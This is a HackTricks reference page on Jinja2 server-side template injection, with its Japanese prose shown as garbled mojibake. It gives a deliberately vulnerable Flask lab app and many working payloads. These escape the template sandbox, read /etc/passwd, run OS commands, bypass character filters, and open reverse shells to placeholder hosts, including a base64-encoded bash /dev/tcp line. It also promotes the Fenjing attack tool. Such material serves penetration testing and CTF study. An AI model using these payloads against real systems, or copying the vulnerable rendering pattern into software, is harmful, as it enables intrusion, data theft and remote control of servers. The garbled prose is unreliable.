# Jinja2 SSTI

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[HackTricks](https://github.com/carlospolop/hacktricks)ã¨[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## **Lab**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
### **ãƒ‡ãƒãƒƒã‚°ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆ**

ãƒ‡ãƒãƒƒã‚°æ‹¡å¼µæ©Ÿèƒ½ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€`debug`ã‚¿ã‚°ãŒä½¿ç”¨å¯èƒ½ã«ãªã‚Šã€ç¾åœ¨ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚„åˆ©ç”¨å¯èƒ½ãªãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ãŠã‚ˆã³ãƒ†ã‚¹ãƒˆã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ‡ãƒãƒƒã‚¬ã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã›ãšã«ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§ä½¿ç”¨å¯èƒ½ãªã‚‚ã®ã‚’ç¢ºèªã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}





</pre>
```
### **ã™ã¹ã¦ã®æ§‹æˆå¤‰æ•°ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹**

ã‚½ãƒ¼ã‚¹: [https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}



```
## **Jinjaã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**

ã¾ãšç¬¬ä¸€ã«ã€Jinjaã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã‹ã‚‰è„±å‡ºã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘**ã€é€šå¸¸ã®Pythonå®Ÿè¡Œãƒ•ãƒ­ãƒ¼ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’å›å¾©ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã†ãŸã‚ã«ã¯ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ãª**éã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒã‹ã‚‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ‚ªç”¨**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

ãŸã¨ãˆã°ã€ã‚³ãƒ¼ãƒ‰`render_template("hello.html", username=username, email=email)`ã§ã¯ã€usernameã¨emailã¨ã„ã†ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯**éã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã®Pythonç’°å¢ƒã‹ã‚‰å–å¾—**ã•ã‚Œã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒå†…ã§ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ã«ãªã‚Šã¾ã™ã€‚\
ã•ã‚‰ã«ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒã‹ã‚‰ã¯å¸¸ã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ãªä»–ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚‚ã‚ã‚Šã¾ã™ã€‚
```
[]
''
()
dict
config
request
```
### \<class 'object'> ã®å›å¾©

æ¬¡ã«ã€ã“ã‚Œã‚‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ã‚¯ãƒ©ã‚¹ **`<class 'object'>`** ã«åˆ°é”ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€å®šç¾©æ¸ˆã¿ã® **ã‚¯ãƒ©ã‚¹** ã‚’ **å›å¾©** ã—ã‚ˆã†ã¨ã™ã‚‹ãŸã‚ã§ã™ã€‚ã“ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ **`__subclasses__`** ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã—ã€**ãƒãƒ³ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹**ã®Pythonç’°å¢ƒã‹ã‚‰ã™ã¹ã¦ã®ã‚¯ãƒ©ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

ãã® **ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹** ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€**ã‚¯ãƒ©ã‚¹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹**ã—ã€**`__base__`**ã€**`__mro__()[-1]`**ã€ã¾ãŸã¯ `.`**`mro()[-1]`** ã®ã„ãšã‚Œã‹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã—ã¦ã€ã“ã® **ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹** ã«åˆ°é”ã—ãŸå¾Œã« **`__subclasses__()`** ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚

ã“ã‚Œã‚‰ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}



# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE Escaping

**`<class 'object'>`ã‚’å›å¾©**ã—ã€`__subclasses__`ã‚’å‘¼ã³å‡ºã—ãŸå¾Œã€ã“ã‚Œã‚‰ã®ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿æ›¸ãã—ã€ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

`__subclasses__`ã¸ã®å‘¼ã³å‡ºã—ã«ã‚ˆã‚Šã€**æ•°ç™¾ã®æ–°ã—ã„é–¢æ•°ã«ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã—ãŸã€‚å˜ã«**ãƒ•ã‚¡ã‚¤ãƒ«ã‚¯ãƒ©ã‚¹**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã ã‘ã§**ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ã**ã‚„`os`ã®ã‚ˆã†ãª**ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œã‚’è¨±å¯ã™ã‚‹ã‚¯ãƒ©ã‚¹**ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã“ã¨ã«æº€è¶³ã™ã‚‹ã§ã—ã‚‡ã†ã€‚

**ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ã**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**RCE**
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Without '{{' and '}}'

<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> a </div>

# Calling os.popen without guessing the index of the class
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


## Passing the cmd line ?cmd=id, Without " and '
{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}

```
ä»¥ä¸‹ã®ã‚¯ãƒ©ã‚¹ã«ã¤ã„ã¦å­¦ã¶ã«ã¯ã€**ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—**ã«ä½¿ç”¨ã§ãã‚‹**ã•ã‚‰ãªã‚‹ã‚¯ãƒ©ã‚¹**ã«ã¤ã„ã¦**ç¢ºèª**ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ãƒã‚¤ãƒ‘ã‚¹

#### ä¸€èˆ¬çš„ãªãƒã‚¤ãƒ‘ã‚¹

ã“ã‚Œã‚‰ã®ãƒã‚¤ãƒ‘ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ä¸€éƒ¨ã®æ–‡å­—ã‚’ä½¿ç”¨ã›ãšã«**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®**å±æ€§ã«ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ãƒã‚¤ãƒ‘ã‚¹ã®ã„ãã¤ã‹ã¯ã€å‰è¿°ã®ä¾‹ã§æ—¢ã«è¦‹ã¦ãã¾ã—ãŸãŒã€ã“ã“ã§ã¾ã¨ã‚ã¦ã¿ã¾ã—ã‚‡ã†ï¼š
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}



```
* [**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã•ã‚‰ãªã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã“ã¡ã‚‰ã‚’ã‚¯ãƒªãƒƒã‚¯**](jinja2-ssti.md#accessing-global-objects)
* [**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã•ã‚‰ãªã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã“ã¡ã‚‰ã‚’ã‚¯ãƒªãƒƒã‚¯**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹ãªã—ã§RCEã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€ã“ã‚Œã‚’èª­ã‚“ã§ãã ã•ã„**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’å›é¿ã™ã‚‹**

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®ç†ç”±ã‹ã‚‰ã€Flaskã¯ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã®ã™ã¹ã¦ã®ã‚’HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe`**ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ã«ãƒšãƒ¼ã‚¸ã«JavaScriptã¨HTMLã‚’**HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã›ãšã«**ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆã§ãã¾ã™ï¼š
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**æ‚ªæ„ã®ã‚ã‚‹è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ã„ã¦RCEã‚’é”æˆã—ã¾ã™ã€‚**
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## ã„ãã¤ã‹ã®æ–‡å­—ãªã—

**`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`**
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}



```
## Jinjaã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**\<class 'object'>**ãªã—

[**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**](jinja2-ssti.md#accessing-global-objects)ã‹ã‚‰ã€**ãã®ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã›ãšã«RCEã«åˆ°é”ã™ã‚‹**åˆ¥ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰**é–¢æ•°**ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚Œã°ã€**`__globals__.__builtins__`**ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã€ãã“ã‹ã‚‰**RCE**ã¯éå¸¸ã«**ç°¡å˜**ã«ãªã‚Šã¾ã™ã€‚

**`request`**ã€**`config`**ã€ãŠã‚ˆã³ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªä»–ã®**èˆˆå‘³æ·±ã„ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã‹ã‚‰**é–¢æ•°**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
ä¸€åº¦ã„ãã¤ã‹ã®é–¢æ•°ã‚’è¦‹ã¤ã‘ãŸã‚‰ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¦çµ„ã¿è¾¼ã¿é–¢æ•°ã‚’å¾©å…ƒã§ãã¾ã™ï¼š
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
### Fuzzing WAF bypass

**Fenjing** [https://github.com/Marven11/Fenjing](https://github.com/Marven11/Fenjing) æ˜¯ä¸€ç§ä¸“é—¨ç”¨äº CTF çš„å·¥å…·ï¼Œä½†ä¹Ÿå¯ä»¥ç”¨äºåœ¨çœŸå®åœºæ™¯ä¸­æš´åŠ›ç ´è§£æ— æ•ˆå‚æ•°ã€‚è¯¥å·¥å…·åªæ˜¯ç®€å•åœ°å‘é€å•è¯å’ŒæŸ¥è¯¢ä»¥æ£€æµ‹è¿‡æ»¤å™¨ï¼Œæœç´¢ç»•è¿‡æ–¹å¼ï¼Œå¹¶æä¾›äº¤äº’å¼æ§åˆ¶å°ã€‚
```
webui:
As the name suggests, web UI
Default port 11451

scan: scan the entire website
Extract all forms from the website based on the form element and attack them
After the scan is successful, a simulated terminal will be provided or the given command will be executed.
Example:python -m fenjing scan --url 'http://xxx/'

crack: Attack a specific form
You need to specify the form's url, action (GET or POST) and all fields (such as 'name')
After a successful attack, a simulated terminal will also be provided or a given command will be executed.
Example:python -m fenjing crack --url 'http://xxx/' --method GET --inputs name

crack-path: attack a specific path
Attack http://xxx.xxx/hello/<payload>the vulnerabilities that exist in a certain path (such as
The parameters are roughly the same as crack, but you only need to provide the corresponding path
Example:python -m fenjing crack-path --url 'http://xxx/hello/'

crack-request: Read a request file for attack
Read the request in the file, PAYLOADreplace it with the actual payload and submit it
The request will be urlencoded by default according to the HTTP format, which can be --urlencode-payload 0turned off.
```
## å‚è€ƒæ–‡çŒ®

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* ã“ã“ã§ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆåŒ–ã•ã‚ŒãŸæ–‡å­—ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã® [attrãƒˆãƒªãƒƒã‚¯ã‚’ãƒã‚§ãƒƒã‚¯](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3)ã—ã¦ãã ã•ã„ã€‚
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
